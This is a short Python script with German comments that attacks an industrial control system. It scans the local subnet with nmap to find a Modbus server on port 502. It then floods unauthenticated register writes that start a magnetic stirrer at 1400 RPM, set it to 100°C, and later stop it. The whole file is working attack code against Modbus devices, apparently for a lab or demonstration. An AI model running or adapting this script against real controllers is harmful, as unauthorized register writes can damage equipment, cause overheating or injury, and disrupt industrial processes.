#!/usr/bin/python3
from pymodbus.client.sync import ModbusTcpClient
import subprocess
import shlex
import time
import sys

# Find die Modbus Server IP im Netzwerk mittels Nmap Scan
def find_modbus_server():
    # Bestimme das Subnetz in der CIDR-Notation
    ip_route_output = subprocess.check_output(shlex.split('ip route'), encoding='utf-8')
    cidr = ip_route_output.strip().split()[11]
    print("Subnetz gefunden: {}".format(cidr))
    # z.B. 192.168.178.0/24

    # Finde die IP des Modbus Server
    dirty_nmap_output = subprocess.Popen(shlex.split('nmap --script modbus-discover.nse --script-args="modbus-discover.aggressive=true" -p 502 ' + cidr + ' --open -oG -'), stdout=subprocess.PIPE)
    nmap_output = subprocess.check_output(shlex.split('awk "/Up$/{print $2}"'), encoding='utf-8', stdin=dirty_nmap_output.stdout).strip()
    # z.B. 192.168.178.44

    if nmap_output:
        print("Modbus Server gefunden: {}".format(nmap_output))
    else:
        print("Modbus Server im Subnetz nicht gefunden!")

    return nmap_output

# Setzt die Register Werte auf die gewünschten Register für eine gewisse Zeit
def spam_modbus_register_values(modbus_ip, seconds, register, register_values):
    client = ModbusTcpClient(modbus_ip)
    if not client.connect():
        print("Der Modbus Server läuft nicht.")
        sys.exit(1)

    print("Setze die Werte {} \t auf Register {} für {} Sekunden".format(register_values, register + 1, seconds))
    time_end = time.time() + seconds
    while time.time() < time_end:
        client.write_registers(register, register_values)

    client.close()

if __name__ == '__main__':
    # Modbus Server IP finden
    modbus_ip = find_modbus_server()

    # Für 10 Sekunden beginnend ab dem ersten Register, die Werte 1, 1400 und 100 setzen
    # (Magnetrührer starten, 1400 RPM und Temperatur auf 100°C stellen)
    spam_modbus_register_values(modbus_ip=modbus_ip, seconds=10, register=0, register_values=[1, 1400, 100])

    # Für 5 Sekunden auf dem ersten Register den Wert 0 setzen
    # (Magnetrührer stoppen)
    spam_modbus_register_values(modbus_ip=modbus_ip, seconds=5, register=0, register_values=[0])
